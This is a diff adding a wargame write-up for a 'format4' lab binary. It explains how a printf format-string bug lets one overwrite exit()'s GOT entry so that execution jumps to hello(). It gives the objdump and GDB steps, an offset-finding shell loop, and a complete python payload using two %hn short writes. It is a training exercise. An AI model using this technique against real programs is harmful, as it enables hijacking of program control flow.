@@ -1,0 +1,26 @@
+In this problem, we need to redirect the excution flow to function hello(). this fgets() has a size check and vuln() function ends with exit(), exit() does not return, thus return-oriented buffer overflow can not be exploited, thus we exploit printf(buffer).
+
+the basic idea is to modify the entry of exit() in GOT table to address of hello() function, thus when exit() is called, the execution flow will jump to hello().
+
+so we need a target address(exit()'s entry in GOT) and a target value(address of function hello()), and this problem will be same as format3.
+
+we use objdump to get exit()'s entry in GOT:
+      objdump -TR format4 | grep exit
+we get the address: 0x0804a01c
+
+next we use GDB to get hello()'s address:
+      0x80484eb
+
+next we use same tricks as format3 to override the value in address 0x0804a01c with value 0x80484eb
+
+(a), we get the offset of format string
+    for i in {1..10}; do echo "trying offset $i - $(echo DDDD%$i\$08x | ./format4)"; done | grep DDDD44444444
+       trying offset 4 - DDDD44444444
+(b), we use to short writes to override the address
+    hello() address is 0x080484eb
+    We can split it so: 
+       0x0804 = 2052 will be written in the 2 last bytes of the target address -> 0x0804a01e 
+       0x84eb = 34027 will be written in the 2 first bytes of the target address -> 0x0804a01c
+(c), Since 34027 > 2052 we need to write 2052 first, then 34027
+    python -c "print '\x1e\xa0\x04\x08'+'\x1c\xa0\x04\x08'+'%2044x'+'%4\$hn'+'%31975x'+'%5\$hn'" | ./format4
+
